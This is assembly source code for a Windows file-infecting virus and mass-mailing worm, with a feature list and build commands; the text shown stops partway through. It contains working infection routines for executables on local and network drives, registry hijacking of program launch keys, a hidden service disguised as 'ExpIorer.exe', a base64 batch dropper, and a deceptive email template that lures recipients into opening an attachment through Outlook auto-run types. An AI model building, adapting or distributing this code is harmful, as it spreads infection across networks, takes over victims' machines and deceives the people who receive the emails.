   ;
   ; comment ;)
   ; W32.JunkMail by roy g biv / RT Fishel
   ;
   ; some of its features:
   ; - parasitic resident (own process) infector of PE exe (but not looking at suffix)
   ; - infects files in all directories on all fixed and network drives and network shares
   ; - directory traversal is linked-list instead of recursive to reduce stack size
   ; - enumerates shares on local network and also random IP addresses
   ; - reloc section inserter/last section appender
   ; - runs as service in NT/2000/XP and service process in 9x/Me
   ; - hooks all executable shell\open\command values
   ; - slow mailer using polymorphic mail headers and transport (text/OLE2/binary)
   ; - auto function type selection (Unicode under NT/2000/XP, ANSI under 9x/Me)
   ; - uses CRCs instead of API names
   ; - uses SEH for common code exit
   ; - section attributes are never altered (virus is self-modifying but runs in writable memory)
   ; - no infect files with data outside of image (eg self-extractors)
   ; - infected files are padded by random amounts to confuse tail scanners
   ; - uses SEH walker to find kernel address (no hard-coded addresses)
   ; - correct file checksum without using imagehlp.dll :) 100% correct algorithm
   ; - plus some new code optimisations that were never seen before W32.EfishNC :)
   ;
   ; yes, just a W32.EfishNC remake with SMTP client engine
   ; ---
   ;
   ;   optimisation tip: Windows appends ".dll" automatically, so this works:
   ;         push "cfs"
   ;         push esp
   ;         call LoadLibraryA
   ; ---
   ;
   ; to build this thing:
   ; tasm
   ; ----
   ; tasm32 /ml /m3 junkmail
   ; tlink32 /B:400000 /x junkmail,,,import32
   ;
   ; Virus is not self-modifying, so no need to alter section attributes
   ; ---
   ;
   ; We're in the middle of a phase transition:
   ; a butterfly flapping its wings at
   ; just the right moment could
   ; cause a storm to happen.
   ; -I'm trying to understand-
   ; I'm at a moment in my life-
   ; I don't know where to flap my wings.
   ; (Danny Hillis)
   ;
   ; (;

   .486
   .model  flat

   extern  GlobalAlloc:proc
   extern  CreateFileA:proc
   extern  GetFileSize:proc
   extern  GetModuleFileNameA:proc
   extern  ReadFile:proc
   extern  WriteFile:proc
   extern  CloseHandle:proc
   extern  GlobalFree:proc
   extern  GetCurrentProcess:proc
   extern  WriteProcessMemory:proc
   extern  MessageBoxA:proc
   extern  ExitProcess:proc

   .data

   ;to alter the text here, set compress_only to not-zero then run
   ;in that case, the compressed text is written to a file only

   compress_only   equ     0

   ife compress_only

   ;must be reverse alphabetical order because they are stored on stack
   ;API names are not present in replications, only in dropper

   expnames        db      "WriteFile"           , 0
                   db      "WinExec"             , 0
                   db      "SetFileAttributesA"  , 0
                   db      "MoveFileA"           , 0
                   db      "LoadLibraryA"        , 0
                   db      "GlobalFree"          , 0
                   db      "GlobalAlloc"         , 0
                   db      "GetWindowsDirectoryA", 0
                   db      "GetTickCount"        , 0
                   db      "GetTempFileNameA"    , 0
                   db      "GetFileAttributesA"  , 0
                   db      "GetCurrentProcess"   , 0
                   db      "DeleteFileA"         , 0
                   db      "CreateFileA"         , 0
                   db      "CloseHandle"         , 0

   regnames        db      "RegSetValueA"      , 0
                   db      "OpenSCManagerA"    , 0
                   db      "CreateServiceA"    , 0
                   db      "CloseServiceHandle", 0

   exenames        db      "LoadLibraryA"   , 0
                   db      "GlobalAlloc"    , 0
                   db      "GetVersion"     , 0
                   db      "GetTickCount"   , 0
                   db      "GetStartupInfoW", 0
                   db      "GetStartupInfoA", 0
                   db      "GetCommandLineW", 0
                   db      "GetCommandLineA", 0
                   db      "ExitProcess"    , 0
                   db      "CreateProcessW" , 0
                   db      "CreateProcessA" , 0

   usrnames        db      "CharNextW", 0
                   db      "CharNextA", 0

   svcnames        db      "StartServiceCtrlDispatcherA", 0

   krnnames        db      "lstrlenW"                 , 0
                   db      "lstrcpyW"                 , 0
                   db      "lstrcatW"                 , 0
                   db      "UnmapViewOfFile"          , 0
                   db      "Sleep"                    , 0
                   db      "SetFileTime"              , 0
                   db      "SetFileAttributesW"       , 0
                   db      "SetFileAttributesA"       , 0
                   db      "SetCurrentDirectoryW"     , 0
                   db      "SetCurrentDirectoryA"     , 0
                   db      "ReadFile"                 , 0
                   db      "MultiByteToWideChar"      , 0
                   db      "MapViewOfFile"            , 0
                   db      "LoadLibraryA"             , 0
                   db      "GlobalFree"               , 0
                   db      "GlobalAlloc"              , 0
                   db      "GetVersion"               , 0
                   db      "GetTickCount"             , 0
                   db      "GetModuleFileNameA"       , 0
                   db      "GetFullPathNameW"         , 0
                   db      "GetFullPathNameA"         , 0
                   db      "GetFileSize"              , 0
                   db      "GetDriveTypeA"            , 0
                   db      "FindNextFileW"            , 0
                   db      "FindNextFileA"            , 0
                   db      "FindFirstFileW"           , 0
                   db      "FindFirstFileA"           , 0
                   db      "FindClose"                , 0
                   db      "CreateThread"             , 0
                   db      "CreateFileW"              , 0
                   db      "CreateFileMappingA"       , 0
                   db      "CreateFileA"              , 0
                   db      "CloseHandle"              , 0

   sfcnames        db      "SfcIsFileProtected", 0

   ws2names        db      "socket"       , 0
                   db      "send"         , 0
                   db      "gethostbyname", 0
                   db      "connect"      , 0
                   db      "WSAStartup"   , 0

   netnames        db      "WNetOpenEnumW"    , 0
                   db      "WNetOpenEnumA"    , 0
                   db      "WNetEnumResourceW", 0
                   db      "WNetEnumResourceA", 0
                   db      "WNetCloseEnum"    , 0

   ip9xnames       db      "NetShareEnum", 0

   ipntnames       db      "NetShareEnum"    , 0
                   db      "NetApiBufferFree", 0

   endif

   ;only 0dh is required for new line, since 0ah is appended by decompressor

   user1           equ     ' '
   user2           equ     '-'
   user3           equ     '/'                     ;the three most frequent characters

   ourcid          equ     "EMAIL"                 ;something that users will open

   smtp1           db      offset smtp2 - offset $ - 2, "HELO ", 0
   smtp2           db      offset smtp3 - offset $ - 2, "MAIL FROM:<>", 0dh, 0
   smtp3           db      offset smtp4 - offset $ - 2, "RCPT TO:", 0
   smtp4           db      offset header1 - offset $ - 2, "DATA", 0dh, 0
   header1         db      offset header2 - offset $ - 2, "FROM: ", 0
   header2         db      offset subject1 - offset $ - 2, "SUBJECT: ", 0

   ;-----------------------------------------------------------------------------
   ;e-mail subject texts
   ;high bit set for list of phrases from which to choose randomly
   ;other bits are number of entries in list
   ;-----------------------------------------------------------------------------

   subject1        db      83h
                   db      offset subject1b - offset $ - 1, "Does this belong to you"
   subject1b       db      offset subject1c - offset $ - 1, "Do you own this file"
   subject1c       db      offset subject1d - offset $ - 1, "Is this your file"
   subject1d       equ     $

   subject2        db      offset subject2b - offset $ - 1, " - "
   subject2b       db      0

   header31        db      offset header32 - offset $ - 2, ".ZIP", 0dh, "MIME-VERSION:", 0
   header32        db      offset part11 - offset $ - 2, "1.0", 0
   part11          db      offset part12 - offset $ - 2, "CONTENT-TYPE:", 0
   part12          db      offset part13 - offset $ - 2, "MULTIPART/MIXED;", 0
   part13          db      offset body1 - offset $ - 2, " BOUNDARY=", 0

   ;-----------------------------------------------------------------------------
   ;e-mail body texts
   ;high bit set for list of phrases from which to choose randomly
   ;other bits are number of entries in list
   ;-----------------------------------------------------------------------------

   body1           db      offset body2 - offset $ - 1
                   db      0dh, "I received this file from you yesterday "

   body2           db      83h
                   db      offset body2b - offset $ - 1, "afternoon"
   body2b          db      offset body2c - offset $ - 1, "evening"
   body2c          db      offset body2d - offset $ - 1, "morning"
   body2d          equ     $

   body3           db      offset body4 - offset $ - 1
                   db      ".", 0dh, "I think it was sent without you knowing by the "

   body4           db      87h
                   db      offset body4b - offset $ - 1, "Aliz"
   body4b          db      offset body4c - offset $ - 1, "Badtrans"
   body4c          db      offset body4d - offset $ - 1, "Goner"
   body4d          db      offset body4e - offset $ - 1, "Klez"
   body4e          db      offset body4f - offset $ - 1, "Magistr"
   body4f          db      offset body4g - offset $ - 1, "Nimda"
   body4g          db      offset body4h - offset $ - 1, "Sircam"
   body4h          equ     $

   body5           db      offset body6 - offset $ - 1, " "

   body6           db      83h
                   db      offset body6b - offset $ - 1, "trojan"
   body6b          db      offset body6c - offset $ - 1, "virus"
   body6c          db      offset body6d - offset $ - 1, "worm"
   body6d          equ     $

   body7           db      offset body8 - offset $ - 1, ".", 0dh
                   db      "The filename was "

   ;be careful here: remember that line length is 76 characters

   body8           db      83h
                   db      offset body8b - offset $ - 1, "alter"
   body8b          db      offset body8c - offset $ - 1, "chang"
   body8c          db      offset body8d - offset $ - 1, "replac"
   body8d          equ     $

   body9           db      offset bodya - offset $ - 1
                   db      "ed but it looked like an important "

   bodya           db      85h
                   db      offset bodyab - offset $ - 1, "database"
   bodyab          db      offset bodyac - offset $ - 1, "document"
   bodyac          db      offset bodyad - offset $ - 1, "picture"
   bodyad          db      offset bodyae - offset $ - 1, "spredsheet" ;reduce size
   bodyae          db      offset bodyaf - offset $ - 1, "video"
   bodyaf          equ     $

   bodyb           db      offset bodyc - offset $ - 1
                   db      " inside.", 0dh, "You should look at this file to see what it is.", 0dh
   bodyc           db      offset bodyd - offset $ - 1
                   db      "The attachment might open automatically. This is normal behaviour.", 0dh
   bodyd           db      offset bodye - offset $ - 1
                   db      "If you see a prompt to Open or Save the email then choose Open.", 0dh
   bodye           db      offset bodyf - offset $ - 1
                   db      "If the attachment is blocked by Outlook 2002 then see", 0dh
   bodyf           db      offset bodyg - offset $ - 1
                   db      "http://support.microsoft.com/support/kb/articles/q290/4/97.asp", 0dh
   bodyg           db      0
   part21          db      offset part22 - offset $ - 2, "TEXT/HTML", 0
   part22          db      offset part23 - offset $ - 2, 0dh, "CONTENT-TRANSFER-ENCODING:", 0
   part23          db      offset part24 - offset $ - 2, "QUOTED-PRINTABLE", 0
   part24          db      offset content - offset $ - 2, 0dh, 0dh, "<IFRAME SRC=CID:", ourcid, " WIDTH=0>", 0

   ;-----------------------------------------------------------------------------
   ;these types open without prompt in unpatched Outlook
   ;-----------------------------------------------------------------------------

   content         db      9bh                     ;total of exploited, CIDs, and not-exploited types
                   db      offset autorunb - offset $ - 1, "APPLICATION/X-MPLAYER2;"
   autorunb        db      offset autorunc - offset $ - 1, "AUDIO/AIFF;"
   autorunc        db      offset autorund - offset $ - 1, "AUDIO/MID;"
   autorund        db      offset autorune - offset $ - 1, "AUDIO/MIDI;"
   autorune        db      offset autorunf - offset $ - 1, "AUDIO/MPEG;"
   autorunf        db      offset autorung - offset $ - 1, "AUDIO/X-MID;"
   autorung        db      offset autorunh - offset $ - 1, "AUDIO/X-MIDI;"
   autorunh        db      offset autoruni - offset $ - 1, "AUDIO/X-MPEGURL;"
   autoruni        db      offset autorunj - offset $ - 1, "AUDIO/X-MS-WAX;"
   autorunj        db      offset autorunk - offset $ - 1, "AUDIO/X-MS-WMA;"
   autorunk        db      offset autorunl - offset $ - 1, "AUDIO/X-WAV;"
   autorunl        db      offset autorunm - offset $ - 1, "MIDI/MID;"
   autorunm        db      offset autorunn - offset $ - 1, "VIDEO/MSVIDEO;"
   autorunn        db      offset autoruno - offset $ - 1, "VIDEO/QUICKTIME;"
   autoruno        db      offset autorunp - offset $ - 1, "VIDEO/X-IVF;"
   autorunp        db      offset autorunq - offset $ - 1, "VIDEO/X-MPEG;"
   autorunq        db      offset autorunr - offset $ - 1, "VIDEO/X-MPEG2A;"
   autorunr        db      offset autoruns - offset $ - 1, "VIDEO/X-MS-ASF;"
   autoruns        db      offset autorunt - offset $ - 1, "VIDEO/X-MS-ASF-PLUGIN;"
   autorunt        db      offset autorunu - offset $ - 1, "VIDEO/X-MS-WM;"
   autorunu        db      offset autorunv - offset $ - 1, "VIDEO/X-MS-WMV;"
   autorunv        db      offset autorunw - offset $ - 1, "VIDEO/X-MS-WVX;"
   autorunw        equ     $

   ;-----------------------------------------------------------------------------
   ;these are types that display the CID instead of the filename,
   ;so using a good choice for CID (eg email) will make many users open it
   ;-----------------------------------------------------------------------------

                   db      offset usecidb - offset $ - 1, "APPLICATION/FUTURESPLASH;"
   usecidb         db      offset usecidc - offset $ - 1, "APPLICATION/HTA;"
   usecidc         db      offset usecidd - offset $ - 1, "APPLICATION/X-SHOCKWAVE-FLASH;"
   usecidd         db      offset usecide - offset $ - 1, "TEXT/X-SCRIPTLET;"

   ;-----------------------------------------------------------------------------
   ;and, of course, a not-exploited type
   ;-----------------------------------------------------------------------------

   usecide         db      offset usecidf - offset $ - 1, "APPLICATION/OCTET-STREAM;"
   usecidf         db      0

   part31          db      offset suffix1 - offset $ - 2, " NAME=EMAIL", 0

   suffix1         db      8ah
                   db      offset suffix1b - offset $ - 1, ".AVI"
   suffix1b        db      offset suffix1c - offset $ - 1, ".BMP"
   suffix1c        db      offset suffix1d - offset $ - 1, ".DOC"
   suffix1d        db      offset suffix1e - offset $ - 1, ".GIF"
   suffix1e        db      offset suffix1f - offset $ - 1, ".JPG"
   suffix1f        db      offset suffix1g - offset $ - 1, ".MDB"
   suffix1g        db      offset suffix1h - offset $ - 1, ".MPG"
   suffix1h        db      offset suffix1i - offset $ - 1, ".TXT"
   suffix1i        db      offset suffix1j - offset $ - 1, ".XLS"
   suffix1j        db      offset suffix1k - offset $ - 1, ".ZIP"
   suffix1k        db      0

   suffix2         db      86h
                   db      offset suffix2b - offset $ - 1, ".BAT"  ;text, not binary
                                                                   ;binary cannot be .bat in Windows NT/2000/XP
   suffix2b        db      offset suffix2c - offset $ - 1, ".COM"
   suffix2c        db      offset suffix2d - offset $ - 1, ".EXE"
   suffix2d        db      offset suffix2e - offset $ - 1, ".PIF"  ;hidden
   suffix2e        db      offset suffix2f - offset $ - 1, ".SCR"
   suffix2f        db      offset suffix2g - offset $ - 1, ".SHS"  ;ole2, hidden
                                                                   ;.shb cannot launch in Windows 2000/XP
   suffix2g        db      0

   part32          db      offset part33 - offset $ - 2, "BASE64", 0
   part33          db      offset part34 - offset $ - 2, 0dh, "CONTENT-ID:", 0
   part34          db      offset batdrop1 - offset $ - 2, '<', ourcid, '>', 0

   ;-----------------------------------------------------------------------------
   ;OS-independent .bat dropper
   ;-----------------------------------------------------------------------------

   batdrop1        db      offset batdrop2 - offset $ - 1
                   db      "@ECHO OFF", 0dh
                   db      "SET %R=^^^^", 0dh
                   db      "IF NOT %OS%T==T GOTO F", 0dh
                   db      "SET %R=^", 0dh
                   db      ":F", 0dh

   ;-----------------------------------------------------------------------------
   ;COM2ASCII-encoded base64 decoder without dictionary by RT Fishel
   ;-----------------------------------------------------------------------------

   batdrop2        db      offset batdrop3 - offset $ - 1
                   db      "ECHO XPH74bP%R%5W1P](d!(d')t)(d)(d+)t.)t/)l0)l4)t6)t7)t8)l9)l;(d?)lB(dE(dG(dI)tJ(dJ)tK(dL)tM)tN)tP(dP)lR)lR)tU(dU"
   batdrop3        db      offset part35 - offset $ - 2
                   db      ")tZ)tc)tl)tnVX,B,BP_ %%GW44PW%R%jD[FFKt(fDl4Yf():l0s54$)Q444l?v8,ElIv2,6f?C+8IGh)ho(fBQFNu1jRQX5TmZ4#P[5F@IZ4#*I=", 0dh, 0

   part35          db      offset part36 - offset $ - 2, ".", 0dh, 0
   part36          db      offset part37 - offset $ - 2, "QUIT", 0dh, 0
   part37          equ     $

   include junkmail.inc

   txttitle        db      "JunkMail", 0

   if  compress_only
   txtbody         db      "compress done", 0
   else
   txtbody         db      "running...", 0

   patch_host      label   near
           pop     ecx
           push    ecx
           call    $ + 5
           pop     eax
           add     eax, offset host_patch - offset $ + 6
           sub     ecx, eax
           push    ecx
           mov     eax, esp
           xor     edi, edi
           push    edi
           push    4
           push    eax
           push    offset host_patch + 1
           push    esi
           call    WriteProcessMemory
           jmp     junkmail_inf

   ;-----------------------------------------------------------------------------
   ;everything before this point is dropper code
   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;virus code begins here in infected files
   ;-----------------------------------------------------------------------------

   junkmail_inf    proc    near
           pushad
           call    walk_seh

   ;-----------------------------------------------------------------------------
   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   expcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
           dd      (expcrc_count + 1) dup (0)
   expcrcend       label   near
           dd      offset drop_exp - offset expcrcend + 4
           db      "JunkMail - roy g biv / RT Fishel"
                                                   ;spam just got harder to remove ;)

   walk_seh        label   near
           xor     esi, esi
           lods    dword ptr fs:[esi]
           inc     eax

   seh_loop        label   near
           dec     eax
           xchg    esi, eax
           lods    dword ptr [esi]
           inc     eax
           jne     seh_loop
           lods    dword ptr [esi]

   ;-----------------------------------------------------------------------------
   ;moved label after some data because "e800000000" looks like virus code ;)
   ;-----------------------------------------------------------------------------

   init_findmz     label   near
           inc     eax
           xchg    edi, eax

   find_mzhdr      label   near

   ;-----------------------------------------------------------------------------
   ;do not use hard-coded kernel address values because it is not portable
   ;Microsoft used all different values for 95, 98, NT, 2000, Me, XP
   ;they will maybe change again for every new release
   ;-----------------------------------------------------------------------------

           dec     edi                             ;sub 64kb
           xor     di, di                          ;64kb align
           call    is_pehdr
           jne     find_mzhdr
           mov     ebx, edi
           pop     edi

   ;-----------------------------------------------------------------------------
   ;parse export table
   ;-----------------------------------------------------------------------------

           mov     esi, dword ptr [esi + pehdr.peexport.dirrva - pehdr.pecoff]
           lea     esi, dword ptr [ebx + esi + peexp.expordbase]
           lods    dword ptr [esi]                 ;Ordinal Base
           lea     ebp, dword ptr [eax * 2 + ebx]
           lods    dword ptr [esi]
           lods    dword ptr [esi]
           lods    dword ptr [esi]                 ;Export Address Table RVA
           lea     edx, dword ptr [ebx + eax]
           lods    dword ptr [esi]                 ;Name Pointer Table RVA
           add     ebp, dword ptr [esi]            ;Ordinal Table RVA
           lea     ecx, dword ptr [ebx + eax]
           mov     esi, ecx

   push_export     label   near
           push    ecx

   get_export      label   near
           lods    dword ptr [esi]
           push    ebx
           add     ebx, eax                        ;Name Pointer VA
           or      eax, -1

   crc_outer       label   near
           xor     al, byte ptr [ebx]
           push    8
           pop     ecx

   crc_inner       label   near
           add     eax, eax
           jnb     crc_skip
           xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

   crc_skip        label   near
           loop    crc_inner
           sub     cl, byte ptr [ebx]              ;carry set if not zero
           inc     ebx                             ;carry not altered by inc
           jb      crc_outer
           pop     ebx
           cmp     dword ptr [edi], eax
           jne     get_export

   ;-----------------------------------------------------------------------------
   ;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
   ;this allows to push addresses onto the stack, and the order is known
   ;-----------------------------------------------------------------------------

           pop     ecx
           mov     eax, esi
           sub     eax, ecx                        ;Name Pointer Table VA
           shr     eax, 1
           movzx   eax, word ptr [ebp + eax - 4]   ;get export ordinal
           mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
           add     eax, ebx
           push    eax
           scas    dword ptr [edi]
           cmp     dword ptr [edi], 0
           jne     push_export
           add     edi, dword ptr [edi + 4]
           jmp     edi

   dispname        label   near
           db      "ExpIorer", 0

   explabel        label   near
           db      "ExpIorer.exe", 0

   drop_exp        label   near
           mov     ebx, esp
           lea     esi, dword ptr [edi + offset explabel - offset drop_exp]
           mov     edi, offset junkmail_codeend - offset junkmail_inf + expsize + 80h + 1ffh
                                                   ;file size must be > end of last section
           push    edi
           xor     ebp, ebp                        ;GMEM_FIXED
           push    ebp
           call    dword ptr [ebx + expcrcstk.pGlobalAlloc]
           push    eax                             ;GlobalFree
           push    ebp                             ;WriteFile
           push    esp                             ;WriteFile
           push    edi                             ;WriteFile
           push    ebp                             ;CreateFileA
           push    FILE_ATTRIBUTE_HIDDEN           ;CreateFileA
           push    CREATE_ALWAYS                   ;CreateFileA
           push    ebp                             ;CreateFileA
           push    ebp                             ;CreateFileA
           push    GENERIC_WRITE                   ;CreateFileA
           push    eax                             ;CreateFileA
           lea     ecx, dword ptr [eax + 7fh]
           push    ecx                             ;MoveFileA
           push    eax                             ;MoveFileA
           push    eax                             ;GetFileAttributesA
           push    ebp                             ;SetFileAttributesA
           push    eax                             ;SetFileAttributesA
           push    ecx                             ;DeleteFileA
           push    ecx                             ;GetTempFileNameA
           push    ebp                             ;GetTempFileNameA
           push    esp                             ;GetTempFileNameA
           push    eax                             ;GetTempFileNameA
           push    edi                             ;GetWindowsDirectoryA
           push    eax                             ;GetWindowsDirectoryA
           xchg    ebp, eax
           call    dword ptr [ebx + expcrcstk.pGetWindowsDirectoryA]
           lea     edi, dword ptr [ebp + eax - 1]
           call    dword ptr [ebx + expcrcstk.pGetTempFileNameA]
           call    dword ptr [ebx + expcrcstk.pDeleteFileA]
           mov     al, '\'
           scas    byte ptr [edi]
           je      skip_slash
           stos    byte ptr [edi]

   ;-----------------------------------------------------------------------------
   ;append exe name, assumes name is 0dh bytes long
   ;-----------------------------------------------------------------------------

   skip_slash      label   near
           movs    dword ptr [edi], dword ptr [esi]
           movs    dword ptr [edi], dword ptr [esi]
           movs    dword ptr [edi], dword ptr [esi]
           movs    byte ptr [edi], byte ptr [esi]

   ;-----------------------------------------------------------------------------
   ;anti-anti-file dropper - remove read-only attribute, delete file, rename directory
   ;-----------------------------------------------------------------------------

           call    dword ptr [ebx + expcrcstk.pSetFileAttributesA]
           call    dword ptr [ebx + expcrcstk.pGetFileAttributesA]
           test    al, FILE_ATTRIBUTE_DIRECTORY
           pop     ecx
           pop     eax
           je      skip_move
           push    eax
           push    ecx
           call    dword ptr [ebx + expcrcstk.pMoveFileA]

   skip_move       label   near
           call    dword ptr [ebx + expcrcstk.pCreateFileA]
           push    edi                             ;WriteFile
           push    ebx
           xchg    ebp, eax
           call    dword ptr [ebx + expcrcstk.pGetTickCount]
           xchg    ebx, eax
           xor     ecx, ecx

   ;-----------------------------------------------------------------------------
   ;decompress MZ header, PE header, section table, import table
   ;-----------------------------------------------------------------------------

           call    decomprle

   expsize equ     0d4h
   ;RLE-based compressed MZ header, PE header, import table, section table
   ;execution continues immediately after compressed data.  be careful ;)

           dd      11111111110000011100001011100000b
           ;       mmmmmmmmmmz   01mmz   02mmm
           db      'M', 'Z', "gdi32.dll", 'P', 'E', 4ch, 1, 1
           dd      00000110000111100001001010010000b
           ;       z   01mz   03mmz   02r   04m
           db      2, 2ch, 10h, 88h
           dd      00000111110100100001001000111110b
           ;       z   01mmmmr   02z   04mz   07mm
           db      0fh, 3, 0bh, 1, 56h, (offset junkmail_exe - offset junkmail_inf + expsize) and 0ffh, ((junkmail_exe - offset junkmail_inf + expsize + 1000h) shr 8) and 0ffh
           dd      00001001010010001011000010100001b
           ;       z   02r   04mz   05mz   02mz   02
           db      0ch, 40h, 10h
           dd      00000110000101010111100001111100b
           ;       z   01mz   02mr   07mz   03mmm
           db      2, 1, 4, "Arc"
           dd      00001010000101000111100000101001b
           ;       z   02mz   03mz   07mz   01r   02
           db      ((junkmail_codeend - offset junkmail_inf + expsize + 80h + 1fffh) and not 0fffh) shr 8, expsize, 2
           dd      10000111000011100001110000110101b
           ;       mz   03mz   03mz   03mz   03r  04
           db      1, 1, 1, 1
           dd      10001110101001100101001111001111b
           ;       mz   07r   04mmz   0ar   0er   0e
           db      2, 8, 10h
           dd      00010110000111000010100001101100b
           ;       z   05mz   03mz   02mz   03r   08
           db      10h, ((junkmail_codeend - offset junkmail_inf + expsize + 80h + 1ffh) and not 1ffh) shr 8, 1
           dd      00011110000000000000000000000000b
           ;       z   07m
           db      0e0h
           dd      0
   ;decompressed data follow.  'X' bytes are set to random value every time
   ;       db      'M', 'Z'                ;00
   ;       db      "gdi32.dll", 0          ;02    align 4, filler (overload for dll name and import lookup table RVA)
   ;       db      'P', 'E', 0, 0          ;0c 00 signature (overload for date/time stamp)
   ;       dw      14ch                    ;10 04 machine (overload for forwarder chain)
   ;       dw      1                       ;12 06 number of sections (overload for forwarder chain)
   ;       dd      2                       ;14 08 date/time stamp (overload for dll name RVA)
   ;       dd      102ch                   ;18 0c pointer to symbol table (overload for import address table RVA)
   ;       db      X, X, X, X              ;1c 10 number of symbols
   ;       dw      88h                     ;20 14 size of optional header
   ;       dw      30fh                    ;22 16 characteristics
   ;       dw      10bh                    ;24 18 magic
   ;       db      X                       ;26 1a major linker
   ;       db      X                       ;27 1b minor linker
   ;       dd      0                       ;28 1c size of code (overload for import table terminator)
   ;       dd      56h                     ;2c 20 size of init data (overload for import name table RVA)
   ;       dd      0                       ;30 24 size of uninit data (overload for import name table terminator)
   ;       dd      offset junkmail_exe - offset junkmail_inf + expsize + 1000h
   ;                                       ;34 28 entry point
   ;       db      X, X, X, X              ;38 2c base of code
   ;       dd      0ch                     ;3c 30 base of data (overload for lfanew)
   ;       dd      400000h                 ;40 34 image base
   ;       dd      1000h                   ;44 38 section align
   ;       dd      200h                    ;48 3c file align
   ;       db      1, X                    ;4c 40 major os
   ;       db      X, X                    ;4e 42 minor os
   ;       db      X, X                    ;50 44 major image
   ;       db      X, X                    ;52 46 minor image
   ;       dw      4                       ;54 48 major subsys
   ;       dw      0                       ;56 4a minor subsys (overload for import name table)
   ;       db      "Arc", 0                ;58 4c reserved (overload for import name table)
   ;       dd      (aligned size of code)  ;5c 50 size of image
   ;       dd      expsize                 ;60 54 size of headers
   ;       dd      0                       ;64 58 checksum
   ;       dw      2                       ;68 5c subsystem
   ;       db      X, X                    ;6a 5e dll characteristics
   ;       dd      1                       ;6c 60 size of stack reserve
   ;       dd      1                       ;70 64 size of stack commit
   ;       dd      1                       ;74 68 size of heap reserve
   ;       dd      1                       ;78 6c size of heap commit
   ;       db      X, X, X, X              ;7c 70 loader flags
   ;       dd      2                       ;80 74 number of rva and sizes (ignored by Windows 9x/Me)
   ;       dd      0                       ;84 78 export
   ;       db      X, X, X, X              ;88 7c export
   ;       dd      1008h                   ;8c 80 import
   ;       dd      0                       ;90 84 import
   ;       dd      0                       ;94 88 resource
   ;       db      X, X, X, X              ;98 8c resource
   ;       db      X, X, X, X, X, X, X, X  ;9c 90 exception
   ;       db      X, X, X, X, X, X, X, X  ;a4 98 certificate
   ;       db      X, X, X, X, X, X, X, X  ;ac a0 base reloc (overload for section name)
   ;       dd      0                       ;b4 a8 debug (overload for virtual size)
   ;       dd      1000h                   ;b8 ac debug (overload for virtual address)
   ;       dd      (aligned size of code)  ;bc b0 architecture (overload for file size)
   ;       dd      1                       ;c0 b4 architecture (overload for file offset)
   ;       db      X, X, X, X              ;c4 b8 global data (overload for pointer to relocs)
   ;       db      X, X, X, X              ;c8 bc global data (overload for pointer to line numbers)
   ;       dd      0                       ;cc c0 tls (overload for reloc table and line numbers)
   ;       dd      0e0000000h              ;d0 c4 tls (overload for section characteristics)
   ;                                       ;d4

   copy_exp        label   near
           mov     cx, offset mail_recip - offset junkmail_inf
           sub     esi, offset copy_exp - offset junkmail_inf
           rep     movs byte ptr [edi], byte ptr [esi]
           mov     al, "'"
           stos    byte ptr [edi]
           pop     ebx
           push    ebp
           call    dword ptr [ebx + expcrcstk.pWriteFile]
           push    ebp
           call    dword ptr [ebx + expcrcstk.pCloseHandle]
           pop     eax
           push    eax
           inc     ebp
           je      load_regdll                     ;allow only 1 copy to run
           push    0
           push    eax
           call    dword ptr [ebx + expcrcstk.pWinExec]

   load_regdll     label   near
           sub     esi, offset mail_recip - offset regdll
           push    esi
           call    dword ptr [ebx + expcrcstk.pLoadLibraryA]
           call    init_findmz

   ;-----------------------------------------------------------------------------
   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   regcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
           dd      (regcrc_count + 1) dup (0)
   regcrcend       label   near
           dd      offset reg_file - offset regcrcend + 4

   regval  db      'ExpIorer "%1" %*', 0
   regkey  db      "\com"                          ;no regedit.com ;)
           db      "\exe"                          ;must be 4 bytes long
           db      "\pif"                          ;hook all executable suffix (except .scr which passes /S)
   reg_file        label   near                    ;must follow immediately
           mov     ebx, esp
           mov     ecx, HKEY_LOCAL_MACHINE         ;can obfuscate and same size if push 5+pop ecx+ror ecx, 1

   ;-----------------------------------------------------------------------------
   ;alter Software\Classes in Local Machine and Current User
   ;because in Windows 2000/XP, Current User values override Local Machine values
   ;-----------------------------------------------------------------------------

   reg_loopouter   label   near
           lea     ebp, dword ptr [edi + offset regval - offset reg_file]
           sub     edi, offset reg_file - offset regkey
           push    (offset reg_file - offset regkey) shr 2
           pop     esi

   reg_loopinner   label   near
           push    ecx
           push    "dna"
           push    "mmoc"
           push    "\nep"
           push    "o\ll"
           push    "ehs\"
           push    "elif"
           push    dword ptr [edi]                 ;comfile, exefile, piffile
           push    "sess"
           push    "alc\"
           push    "eraw"
           push    "tfos"                          ;obfuscated ;)
           mov     eax, esp
           push    offset regkey - offset regval
           push    ebp
           push    REG_SZ
           push    eax
           push    ecx
           call    dword ptr [ebx + regcrcstk.rRegSetValueA]
                                                   ;RegSetValue creates keys
           add     esp, 2ch                        ;size software\classes\???file\shell\open\command
           scas    dword ptr [edi]
           pop     ecx
           dec     esi
           jne     reg_loopinner
           loopw   reg_loopouter                   ;decrements CX only

   ;-----------------------------------------------------------------------------
   ;register as service if NT/2000/XP (recognised but ignored by 9x/Me)
   ;no start service because code is running already
   ;-----------------------------------------------------------------------------

           push    SC_MANAGER_CREATE_SERVICE
           push    esi
           push    esi
           call    dword ptr [ebx + regcrcstk.rOpenSCManagerA]
           mov     ecx, dword ptr [ebx + size regcrcstk]
           push    ecx
           push    eax
           push    esi
           push    esi
           push    esi
           push    esi
           push    esi
           push    ecx
           push    esi                             ;SERVICE_ERROR_IGNORE
           push    SERVICE_AUTO_START
           push    SERVICE_WIN32_OWN_PROCESS
           push    esi
           sub     edi, offset reg_file - offset dispname
           push    edi
           add     edi, offset explabel - offset dispname
           push    edi
           push    eax
           call    dword ptr [ebx + regcrcstk.rCreateServiceA]
           push    eax
           call    dword ptr [ebx + regcrcstk.rCloseServiceHandle]
           call    dword ptr [ebx + regcrcstk.rCloseServiceHandle]
           call    dword ptr [ebx + 4 + size regcrcstk + expcrcstk.pGlobalFree]
           popad

   host_patch      label   near
           db      0e9h, 'rgb!'

   ;-----------------------------------------------------------------------------
   ;virus code begins here in dropped exe
   ;-----------------------------------------------------------------------------

   junkmail_exe    label   near
           call    walk_seh

   ;-----------------------------------------------------------------------------
